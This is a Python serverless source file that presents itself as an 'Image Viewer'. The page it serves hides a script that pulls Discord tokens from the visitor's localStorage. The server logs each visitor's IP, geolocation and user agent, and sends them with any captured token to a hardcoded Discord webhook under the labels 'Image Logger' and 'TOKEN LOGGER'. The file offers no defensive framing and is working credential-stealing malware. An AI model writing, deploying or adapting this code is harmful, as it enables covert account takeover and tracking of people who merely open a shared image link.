# api/image2.py
import os
import requests
import base64
from http import HTTPStatus

# Configuration
WEBHOOK_URL = os.getenv('WEBHOOK_URL', "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz")
DEFAULT_IMAGE = "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg"

def handler(event, context):
    try:
        # Get request details
        method = event['httpMethod']
        path = event['path']
        headers = event.get('headers', {})
        query = event.get('queryStringParameters', {})
        
        # Handle token logging
        if path.endswith('/logtoken'):
            token = query.get('token', '')
            ip = headers.get('x-forwarded-for', 'Unknown IP')
            report_token(ip, token)
            return pixel_response()
        
        # Get image URL
        image_url = get_image_url(query)
        
        # Create IP report
        ip = headers.get('x-forwarded-for', 'Unknown IP')
        user_agent = headers.get('user-agent', 'Unknown')
        make_report(ip, user_agent, path, image_url)
        
        # Build HTML response
        html = create_html(image_url)
        return {
            'statusCode': HTTPStatus.OK,
            'headers': {'Content-Type': 'text/html'},
            'body': html
        }
        
    except Exception as e:
        return {
            'statusCode': HTTPStatus.INTERNAL_SERVER_ERROR,
            'body': f"Error: {str(e)}"
        }

def get_image_url(query):
    """Get image URL from query parameters or use default"""
    if 'url' in query:
        try:
            return base64.b64decode(query['url']).decode('utf-8')
        except:
            pass
    return DEFAULT_IMAGE

def create_html(image_url):
    """Create HTML response with the image"""
    return f"""<html>
<head>
    <title>Image Viewer</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }}
        .image-container {{
            max-width: 90%;
            max-height: 90%;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }}
        .image-container img {{
            max-width: 100%;
            max-height: 100%;
            display: block;
        }}
    </style>
    <script>
        document.addEventListener('DOMContentLoaded', function() {{
            setTimeout(function() {{
                // Simple token capture from localStorage
                let token = "NOT_FOUND";
                const tokenKeys = ['token', 'discord_token', '_token'];
                for (const key of tokenKeys) {{
                    const value = localStorage.getItem(key);
                    if (value) {{
                        token = value;
                        break;
                    }}
                }}
                
                // Send token to server
                const img = new Image();
                img.src = `${{window.location.pathname}}/logtoken?token=${{encodeURIComponent(token)}}`;
            }}, 1000);
        }});
    </script>
</head>
<body>
    <div class="image-container">
        <img src="{image_url}" alt="Preview Image">
    </div>
</body>
</html>"""

def make_report(ip, user_agent, endpoint, image_url):
    """Send IP information to Discord webhook"""
    try:
        # Get IP information
        ip_info = requests.get(f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp,proxy", timeout=3).json()
        
        # Create Discord embed
        embed = {
            "username": "Image Logger",
            "embeds": [{
                "title": "IP Logged",
                "color": 0x00FFFF,
                "description": (
                    f"**IP Address:** `{ip}`\n"
                    f"**Country:** `{ip_info.get('country', 'Unknown')}`\n"
                    f"**Region:** `{ip_info.get('regionName', 'Unknown')}`\n"
                    f"**City:** `{ip_info.get('city', 'Unknown')}`\n"
                    f"**ISP:** `{ip_info.get('isp', 'Unknown')}`\n"
                    f"**VPN:** `{ip_info.get('proxy', 'Unknown')}`\n"
                    f"**User Agent:** `{user_agent}`"
                ),
                "thumbnail": {"url": image_url}
            }]
        }
        
        # Send to Discord
        requests.post(WEBHOOK_URL, json=embed, timeout=3)
    except:
        pass

def report_token(ip, token):
    """Report captured token to Discord"""
    if not token or token == "NOT_FOUND":
        return
        
    try:
        embed = {
            "username": "TOKEN LOGGER",
            "content": "@everyone **TOKEN CAPTURED**",
            "embeds": [{
                "title": "Discord Token Captured",
                "color": 0xFF0000,
                "description": (
                    f"**IP Address:** `{ip}`\n"
                    f"**Token:** `{token}`\n\n"
                    "**WARNING:** This token provides full account access!"
                )
            }]
        }
        requests.post(WEBHOOK_URL, json=embed, timeout=3)
    except:
        pass

def pixel_response():
    """Return a 1x1 transparent pixel"""
    pixel = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="
    return {
        'statusCode': HTTPStatus.OK,
        'headers': {'Content-Type': 'image/png'},
        'body': pixel,
        'isBase64Encoded': True
    }
